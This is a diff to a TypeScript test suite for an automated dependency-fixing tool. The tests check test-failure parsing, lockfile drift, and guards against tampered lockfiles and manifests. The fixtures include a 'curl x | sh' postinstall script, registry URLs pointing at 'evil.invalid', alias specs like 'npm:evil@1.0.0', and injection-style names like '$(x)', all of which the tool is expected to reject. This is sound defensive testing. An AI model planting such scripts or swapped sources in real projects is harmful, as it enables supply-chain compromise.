@@ -7,7 +7,7 @@ import { describe, it } from "node:test";
 import { compareTests, isRegression } from "../src/fixer/baseline.ts";
 import type { PreflightBox } from "../src/fixer/ecosystems/ecosystem.ts";
 import { DIFF_SCRIPT, npm } from "../src/fixer/ecosystems/npm.ts";
-import { pytestFailures, pythonSources } from "../src/fixer/ecosystems/pytest.ts";
+import { npmFailures, pytestFailures, pythonSources } from "../src/fixer/ecosystems/pytest.ts";
 import { requirements } from "../src/fixer/ecosystems/requirements.ts";
 import { uv } from "../src/fixer/ecosystems/uv.ts";
 import type { TestOutcome } from "../src/fixer/pr.ts";
@@ -35,6 +35,11 @@ describe("pytestFailures", () => {
     assert.equal(pytestFailures("3 passed"), null);
   });
 
+  it("keeps the whole id, brackets and spaces included, and drops only the trailing message", () => {
+    const output = ["FAILED tests/t.py::test_x[a b-1] - AssertionError: nope - really", "ERROR tests/t.py::test_y[\u001b[31mred\u001b[0m]", "FAILED tests/t.py::test_z"].join("\n");
+    assert.deepEqual(pytestFailures(output), ["tests/t.py::test_x[a b-1]", "tests/t.py::test_y[red]", "tests/t.py::test_z"]);
+  });
+
   it("is what the python harnesses use, and they no longer stop at the first failure", () => {
     for (const ecosystem of [uv, requirements]) {
       const plan = ecosystem.harness("a.lock");
@@ -42,7 +47,25 @@ describe("pytestFailures", () => {
       assert.doesNotMatch(plan.test, /-x/);
       assert.match(plan.test, /-rfE/);
     }
-    assert.equal(npm.harness("package-lock.json").failures, undefined);
+    assert.equal(npm.harness("package-lock.json").failures, npmFailures);
+  });
+});
+
+describe("npmFailures", () => {
+  it("reads jest and vitest file and test failures", () => {
+    const jest = ["PASS src/ok.test.js", "FAIL src/a.test.js (3.2 s)", "  ✕ adds numbers (5 ms)", "  × handles empty input 12 ms", "Tests: 2 failed"].join("\n");
+    assert.deepEqual(npmFailures(jest), ["adds numbers", "handles empty input", "src/a.test.js"]);
+    assert.deepEqual(npmFailures(" \u001b[41m FAIL \u001b[49m  src/b.test.ts > suite > works"), ["src/b.test.ts > suite > works"]);
+  });
+
+  it("reads mocha's numbered failures, node's test runner and TAP", () => {
+    const mocha = ["  3 passing", "  2 failing", "", "  1) Suite", "       does a thing:", "     AssertionError", "  2) Other suite", "       does another:"].join("\n");
+    assert.deepEqual(npmFailures(mocha), ["Other suite", "Suite"]);
+    assert.deepEqual(npmFailures("✖ rejects bad input (1.2ms)\nnot ok 4 - tap case\n"), ["rejects bad input", "tap case"]);
+  });
+
+  it("finds nothing in output without failures", () => {
+    assert.equal(npmFailures("PASS src/a.test.js\nTests: 3 passed\nnpm error code ELIFECYCLE\n"), null);
   });
 });
 
@@ -125,8 +148,15 @@ describe("npm preflight", () => {
     const v2 = write("v2.json", { name: "x", lockfileVersion: 2, packages, dependencies: { a: { version: "1.0.0" } } });
     const same = write("same.json", { packages, lockfileVersion: 3, name: "x" });
     const drift = (a: string, b: string) => JSON.parse(spawnSync("node", ["-e", DIFF_SCRIPT, a, b], { encoding: "utf8" }).stdout.replace("PRESOLVE ", "")) as Record<string, unknown>;
-    assert.deepEqual(drift(v3, v2), { removed: 0, added: 0, changed: 0, exact: false, sameVersion: false });
-    assert.deepEqual(drift(v3, same), { removed: 0, added: 0, changed: 0, exact: true, sameVersion: true });
+    assert.deepEqual(drift(v3, v2), { removed: 0, added: 0, changed: 0, swapped: 0, exact: false, sameVersion: false });
+    const entry = (extra: Record<string, unknown>) => ({ name: "x", lockfileVersion: 3, packages: { "": { name: "x" }, "node_modules/a": { version: "1.0.0", resolved: "https://registry.npmjs.org/a/-/a-1.0.0.tgz", integrity: "sha512-aaa", ...extra } } });
+    const honest = write("honest.json", entry({}));
+    const swapped = write("swapped.json", entry({ integrity: "sha512-evil" }));
+    const aliased = write("aliased.json", entry({ name: "evil" }));
+    const moved = write("moved.json", entry({ resolved: "https://evil.invalid/a/-/a-1.0.0.tgz" }));
+    for (const other of [swapped, aliased, moved]) assert.equal(drift(honest, other).swapped, 1);
+    assert.equal(drift(honest, honest).swapped, 0);
+    assert.deepEqual(drift(v3, same), { removed: 0, added: 0, changed: 0, swapped: 0, exact: true, sameVersion: true });
   });
 
   it("tries older majors newest first and tells the agent the exact command of the first that leaves it exactly unchanged", async () => {
@@ -164,6 +194,32 @@ describe("npm preflight", () => {
     const only = await npm.preflight!(formatting.fake, "package-lock.json", 1000);
     assert.equal(only.tool, undefined);
     assert.match(only.notes[0]!, /changes only the file's formatting or other top-level fields/);
+  });
+
+  it("gives each candidate its own limit, never more than three minutes, and stops when the total is spent", async () => {
+    const timeouts: number[] = [];
+    const fake: PreflightBox = {
+      async run(_command, timeoutMs) {
+        timeouts.push(timeoutMs);
+        return { exitCode: 1, stdout: "", stderr: "", timedOut: true };
+      },
+    };
+    await npm.preflight!(fake, "package-lock.json", 10 * 60_000);
+    assert.deepEqual(timeouts, [180_000, 180_000, 180_000, 180_000, 180_000]);
+    timeouts.length = 0;
+    await npm.preflight!(fake, "package-lock.json", 5_000);
+    assert.deepEqual(timeouts, [5_000, 5_000, 5_000, 5_000, 5_000]);
+    timeouts.length = 0;
+    let clock = 0;
+    await npm.preflight!(fake, "package-lock.json", 10 * 60_000, () => (clock += 4 * 60_000));
+    assert.ok(timeouts.length >= 2 && timeouts.length < 5, `ran ${timeouts.length}`);
+    assert.ok(timeouts.every((timeout) => timeout <= 180_000));
+  });
+
+  it("stops at the first exact candidate", async () => {
+    const { scripts, fake } = box({ npm: { removed: 1, added: 0, changed: 0 }, "npx -y npm@10": CLEAN });
+    await npm.preflight!(fake, "package-lock.json", 1000);
+    assert.equal(scripts.length, 2);
   });
 
   it("gives nothing when no npm can re-resolve the lockfile at all", async () => {
@@ -388,5 +444,193 @@ describe("overridesPackage", () => {
     assert.equal(uv.overridesPackage!("garbage = [", "acme-ser"), false);
     assert.equal(uv.manifestFile, "pyproject.toml");
     assert.equal(requirements.overridesPackage, undefined);
+  });
+});
+
+describe("manifest guards", () => {
+  const json = (value: unknown) => JSON.stringify(value);
+
+  it("allows only dependency keys to change in package.json, and reports every other changed key", () => {
+    const before = json({ name: "x", version: "1.0.0", scripts: { test: "jest" }, dependencies: { a: "^1" }, overrides: {}, engines: { node: ">=18" } });
+    const ok = json({ name: "x", version: "1.0.0", scripts: { test: "jest" }, dependencies: { a: "^2" }, overrides: { b: "^3" }, resolutions: { c: "1" }, engines: { node: ">=18" } });
+    assert.deepEqual(npm.manifestViolations!(before, ok), []);
+    const bad = json({ name: "y", version: "1.0.0", scripts: { test: "jest", postinstall: "curl x | sh" }, dependencies: { a: "^2" }, engines: { node: ">=20" }, bin: { x: "x.js" } });
+    assert.deepEqual(npm.manifestViolations!(before, bad), ["bin", "engines", "name", "overrides".length ? "scripts" : ""].filter(Boolean).sort());
+    assert.deepEqual(npm.manifestViolations!(before, "not json"), ["the file is not valid JSON"]);
+    assert.deepEqual(npm.manifestViolations!("not json", ok), []);
+  });
+
+  it("reports a changed scripts section as risky for npm", () => {
+    assert.deepEqual(npm.riskyManifestChanges!(json({ scripts: { a: "1" } }), json({ scripts: { a: "2" } })), ["scripts"]);
+    assert.deepEqual(npm.riskyManifestChanges!(json({ scripts: { a: "1" } }), json({ scripts: { a: "1" }, dependencies: { x: "1" } })), []);
+  });
+
+  it("allows only dependency tables to change in pyproject.toml for uv, requires-python and sources included in what is refused", () => {
+    const base = '[project]\nname = "x"\nrequires-python = ">=3.10"\ndependencies = ["a>=1"]\n[project.optional-dependencies]\ndev = ["pytest"]\n[dependency-groups]\ntest = ["b"]\n[tool.uv]\nconstraint-dependencies = ["c>=1"]\n';
+    const ok = base.replace('"a>=1"', '"a>=2"').replace('"pytest"', '"pytest>=8"').replace('"b"', '"b>=2"').replace('"c>=1"', '"c>=2", "d>=1"');
+    assert.deepEqual(uv.manifestViolations!(base, ok), []);
+    assert.deepEqual(uv.manifestViolations!(base, base.replace(">=3.10", ">=3.8")), ["project.requires-python"]);
+    assert.deepEqual(uv.manifestViolations!(base, `${base}[tool.uv.sources]\na = { git = "https://example.invalid/a.git" }\n`), ["tool.uv.sources"]);
+    assert.deepEqual(uv.manifestViolations!(base, base.replace('name = "x"', 'name = "y"')), ["project.name"]);
+    assert.deepEqual(uv.manifestViolations!(base, "garbage = ["), ["the file is not valid TOML"]);
+  });
+
+  it("reports changed entry points and build settings as risky for uv", () => {
+    const base = '[project]\nname = "x"\n[project.scripts]\nrun = "x:main"\n';
+    assert.deepEqual(uv.riskyManifestChanges!(base, base.replace("x:main", "y:main")), ["project.scripts"]);
+    assert.deepEqual(uv.riskyManifestChanges!(base, base), []);
+  });
+});
+
+describe("npm verification against the resolver", () => {
+  const exactRef = { exact: true, removed: 0, added: 0, changed: 0, swapped: 0 };
+
+  it("records what the preflight measured so the committed lockfile can be compared with it", async () => {
+    const bundled = await npm.preflight!(box({ npm: CLEAN }).fake, "package-lock.json", 1000);
+    assert.deepEqual(bundled.reference, { exact: true, removed: 0, added: 0, changed: 0, swapped: 0 });
+    const older = await npm.preflight!(box({ npm: { removed: 5, added: 0, changed: 0 }, "npx -y npm@10": CLEAN }).fake, "package-lock.json", 1000);
+    assert.deepEqual(older.reference, { tool: "npx -y npm@10", exact: true, removed: 0, added: 0, changed: 0, swapped: 0 });
+    const closest = await npm.preflight!(box({ npm: { removed: 5, added: 1, changed: 2, swapped: 3 } as never, "npx -y npm@10": "fail", "npx -y npm@9": "fail", "npx -y npm@8": "fail", "npx -y npm@7": "fail" }).fake, "package-lock.json", 1000);
+    assert.deepEqual(closest.reference, { exact: false, removed: 5, added: 1, changed: 2, swapped: 3 });
+    assert.equal((await npm.preflight!(box({}).fake, "package-lock.json", 1000)).reference, undefined);
+  });
+
+  it("accepts a lockfile the chosen npm leaves exactly unchanged, with the reference's tool", async () => {
+    const { fake, scripts } = box({ "npx -y npm@8": CLEAN });
+    const result = await npm.verify!(fake, "web/package-lock.json", 5000, { ...exactRef, tool: "npx -y npm@8" });
+    assert.equal(result.outcome, "ok");
+    assert.match(result.text, /`npx -y npm@8 install --package-lock-only --no-audit --no-fund` leaves the committed lockfile exactly unchanged/);
+    assert.match(scripts[0]!, /tar -C '\/work\/web'/);
+  });
+
+  it("refuses a lockfile with entries whose resolved, integrity or name the resolver would not produce", async () => {
+    const result = await npm.verify!(box({ npm: { removed: 0, added: 0, changed: 0, swapped: 2, exact: false } as never }).fake, "package-lock.json", 5000, exactRef);
+    assert.equal(result.outcome, "tampered");
+    assert.match(result.text, /2 lockfile entries have a `resolved`, `integrity` or `name` that `npm install --package-lock-only/);
+  });
+
+  it("calls other differences drift, and a failing resolver unknown", async () => {
+    assert.equal((await npm.verify!(box({ npm: { removed: 1, added: 0, changed: 0 } }).fake, "package-lock.json", 5000, exactRef)).outcome, "drift");
+    assert.equal((await npm.verify!(box({ npm: "fail" }).fake, "package-lock.json", 5000, exactRef)).outcome, "unknown");
+    assert.equal((await npm.verify!(box({ npm: CLEAN }).fake, "package-lock.json", 5000, undefined)).outcome, "unknown");
+  });
+
+  it("allows as much drift as the default branch has, but not more swapped entries or more drift", async () => {
+    const reference = { exact: false, removed: 5, added: 0, changed: 1, swapped: 1 };
+    assert.equal((await npm.verify!(box({ npm: { removed: 5, added: 0, changed: 1, swapped: 1 } as never }).fake, "package-lock.json", 5000, reference)).outcome, "ok");
+    assert.equal((await npm.verify!(box({ npm: { removed: 5, added: 0, changed: 1, swapped: 2 } as never }).fake, "package-lock.json", 5000, reference)).outcome, "tampered");
+    assert.equal((await npm.verify!(box({ npm: { removed: 9, added: 0, changed: 1, swapped: 1 } as never }).fake, "package-lock.json", 5000, reference)).outcome, "drift");
+  });
+});
+
+describe("registry checks on the committed lockfile", () => {
+  const entry = (name: string, version: string, extra: Record<string, unknown> = {}) => ({ version, resolved: `https://registry.npmjs.org/${name}/-/${name.split("/").pop()}-${version}.tgz`, integrity: "sha512-x", ...extra });
+  const lock = (packages: Record<string, unknown>) => JSON.stringify({ lockfileVersion: 3, packages: { "": { name: "x" }, ...packages } });
+  const head = lock({ "node_modules/a": entry("a", "1.0.0"), "node_modules/@s/b": entry("@s/b", "1.0.0") });
+  const pairs = [{ path: "package.json", before: JSON.stringify({ dependencies: { a: "^1" } }), after: JSON.stringify({ dependencies: { a: "^1" } }) }];
+
+  it("accepts honest changes, scoped packages and an unchanged entry", () => {
+    const after = lock({ "node_modules/a": entry("a", "1.0.1"), "node_modules/@s/b": entry("@s/b", "1.0.0"), "node_modules/c": entry("c", "2.0.0") });
+    assert.deepEqual(npm.lockfileProblems!(head, after, pairs), []);
+    assert.deepEqual(npm.lockfileProblems!(head, lock({ "node_modules/@s/b": entry("@s/b", "1.1.0") }), pairs), []);
+  });
+
+  it("accepts a private registry whose path has a prefix before the package", () => {
+    const private_ = lock({ "node_modules/a": { ...entry("a", "1.0.0"), resolved: "https://npm.example.invalid/api/npm/a/-/a-1.0.0.tgz" } });
+    const after = lock({ "node_modules/a": { ...entry("a", "1.0.1"), resolved: "https://npm.example.invalid/api/npm/a/-/a-1.0.1.tgz" } });
+    assert.deepEqual(npm.lockfileProblems!(private_, after, pairs), []);
+  });
+
+  it("rejects an entry whose name differs from its path, a host the default branch never used, and a tarball path that is not the package's", () => {
+    const aliased = lock({ "node_modules/a": entry("a", "1.0.1", { name: "evil" }) });
+    assert.match(npm.lockfileProblems!(head, aliased, pairs)[0]!, /node_modules\/a is an alias for evil, not a/);
+    const host = lock({ "node_modules/a": entry("a", "1.0.1", { resolved: "https://evil.invalid/a/-/a-1.0.1.tgz" }) });
+    assert.match(npm.lockfileProblems!(head, host, pairs)[0]!, /resolves from evil\.invalid, which no entry of the default branch's lockfile uses/);
+    const other = lock({ "node_modules/a": entry("a", "1.0.1", { resolved: "https://registry.npmjs.org/evil/-/evil-1.0.1.tgz" }) });
+    assert.match(npm.lockfileProblems!(head, other, pairs)[0]!, /does not end in \/a\/-\/a-1\.0\.1\.tgz/);
+    const version = lock({ "node_modules/a": entry("a", "1.0.1", { resolved: "https://registry.npmjs.org/a/-/a-9.9.9.tgz" }) });
+    assert.equal(npm.lockfileProblems!(head, version, pairs).length, 1);
+  });
+
+  it("rejects dependency specs that are new and not plain versions or ranges, and ignores ones that were already there", () => {
+    const manifest = (dependencies: Record<string, string>) => ({ path: "package.json", before: JSON.stringify({ dependencies: { a: "^1", old: "github:x/old" } }), after: JSON.stringify({ dependencies: { a: "^1", old: "github:x/old", ...dependencies } }) });
+    assert.deepEqual(npm.lockfileProblems!(head, head, [manifest({})]), []);
+    for (const spec of ["npm:evil@1.0.0", "github:x/y", "git+https://example.invalid/y.git", "https://example.invalid/y.tgz", "file:../y", "link:../y"]) {
+      assert.match(npm.lockfileProblems!(head, head, [manifest({ z: spec })])[0]!, /adds a dependency that does not come from the registry by version/, spec);
+    }
+    const overrides = { path: "package.json", before: JSON.stringify({}), after: JSON.stringify({ overrides: { a: "npm:evil@1" } }) };
+    assert.equal(npm.lockfileProblems!(head, head, [overrides]).length, 1);
+    assert.deepEqual(npm.lockfileProblems!(head, head, [{ path: "package.json", before: null, after: JSON.stringify({ dependencies: { a: "^2", b: "~1.2.3", c: "*", d: "1.x" } }) }]), []);
+  });
+});
+
+describe("uv verification and registry checks", () => {
+  const registry = (url: string) => `source = { registry = "${url}" }`;
+  const lock = (...packages: { name: string; version: string; source: string }[]) => `version = 1\n${packages.map((item) => `[[package]]\nname = "${item.name}"\nversion = "${item.version}"\n${item.source}\n`).join("")}`;
+  const PYPI = registry("https://pypi.org/simple");
+  const head = lock({ name: "acme-app", version: "0.1.0", source: 'source = { editable = "." }' }, { name: "acme-lib", version: "1.0.0", source: PYPI });
+
+  it("accepts a changed package from the same registry and rejects another source", () => {
+    assert.deepEqual(uv.lockfileProblems!(head, lock({ name: "acme-app", version: "0.1.0", source: 'source = { editable = "." }' }, { name: "Acme_Lib", version: "1.1.0", source: PYPI }, { name: "new", version: "2.0", source: PYPI }), []), []);
+    const git = lock({ name: "acme-app", version: "0.1.0", source: 'source = { editable = "." }' }, { name: "acme-lib", version: "1.1.0", source: 'source = { git = "https://example.invalid/lib.git" }' });
+    assert.match(uv.lockfileProblems!(head, git, [])[0]!, /acme-lib 1\.1\.0 does not come from a registry \(git\)/);
+    const other = lock({ name: "acme-lib", version: "1.1.0", source: registry("https://evil.invalid/simple") });
+    assert.match(uv.lockfileProblems!(head, other, [])[0]!, /comes from https:\/\/evil\.invalid\/simple, which no package of the default branch's lockfile uses/);
+    const local = lock({ name: "evil-local", version: "1", source: 'source = { editable = "../x" }' });
+    assert.match(uv.lockfileProblems!(head, local, [])[0]!, /local package that the default branch's lockfile does not have/);
+  });
+
+  function uvBox(exit: number | "timeout") {
+    const scripts: string[] = [];
+    const fake: PreflightBox = {
+      async run(command) {
+        scripts.push(command[2]!);
+        return { exitCode: exit === "timeout" ? 124 : exit, stdout: "", stderr: exit === 0 ? "" : "error: The lockfile at `uv.lock` needs to be updated", timedOut: exit === "timeout" };
+      },
+    };
+    return { fake, scripts };
+  }
+
+  it("uses uv lock --check in the lockfile's directory, on the default branch first and on the committed lockfile after", async () => {
+    const clean = uvBox(0);
+    const pre = await uv.preflight!(clean.fake, "svc/uv.lock", 1000);
+    assert.deepEqual(pre.reference, { exact: true, removed: 0, added: 0, changed: 0, swapped: 0 });
+    assert.equal(clean.scripts[0], "cd '/work/svc' && uv lock --check");
+    assert.equal((await uv.verify!(clean.fake, "uv.lock", 1000, pre.reference)).outcome, "ok");
+    assert.equal(clean.scripts[1], "uv lock --check");
+  });
+
+  it("refuses a lockfile that fails the check when the default branch passes, and only drafts it when the default branch fails too", async () => {
+    const failing = uvBox(2);
+    const tampered = await uv.verify!(failing.fake, "uv.lock", 1000, { exact: true, removed: 0, added: 0, changed: 0, swapped: 0 });
+    assert.equal(tampered.outcome, "tampered");
+    assert.match(tampered.text, /fails on the committed uv\.lock although it passes on the default branch: error: The lockfile/);
+    assert.equal((await uv.verify!(failing.fake, "uv.lock", 1000, { exact: false, removed: 0, added: 0, changed: 0, swapped: 0 })).outcome, "drift");
+    assert.equal((await uv.verify!(uvBox("timeout").fake, "uv.lock", 1000, undefined)).outcome, "unknown");
+    assert.equal((await uv.preflight!(uvBox("timeout").fake, "uv.lock", 1000)).reference, undefined);
+  });
+
+  it("has nothing to verify for requirements files", () => {
+    assert.equal(requirements.verify, undefined);
+    assert.equal(requirements.lockfileProblems, undefined);
+  });
+});
+
+describe("shell quoting of paths inside the sandbox", () => {
+  it("quotes a directory with spaces or quotes in the npm review scripts, and refuses package names with dot segments", () => {
+    const sources = npm.reviewSources!("acme-ui", "my app/it's")!;
+    assert.match(sources.search, /\[ -d 'my app\/it'\\''s\/node_modules\/acme-ui' \]/);
+    assert.match(sources.search, /'my app\/it'\\''s\/node_modules\/acme-ui' --exclude-dir=node_modules/);
+    assert.match(sources.files, /find 'my app\/it'\\''s\/node_modules\/acme-ui' -maxdepth 2 -path 'my app\/it'\\''s\/node_modules\/acme-ui\/node_modules' -prune/);
+    for (const name of ["..", "a/../b", "@s/..", "./x", "a//b", "a b", "a;b", "$(x)"]) assert.equal(npm.reviewSources!(name, "."), null, name);
+    assert.ok(npm.reviewSources!("@scope/pkg", "."));
+  });
+
+  it("quotes the directory and the file name in the python review scripts and the requirements install", () => {
+    const sources = pythonSources("acme-lib", "my svc", "python")!;
+    assert.match(sources.search, /^cd .\/work\/my svc. && base=/);
+    assert.equal(requirements.harness("svc/dev requirements.txt").install, "python -m pip install -r 'dev requirements.txt'");
+    assert.equal(requirements.harness("svc/requirements.txt").install, "python -m pip install -r requirements.txt");
+    assert.equal(requirements.harness("a/it's-requirements.txt").install, "python -m pip install -r 'it'\\''s-requirements.txt'");
   });
 });
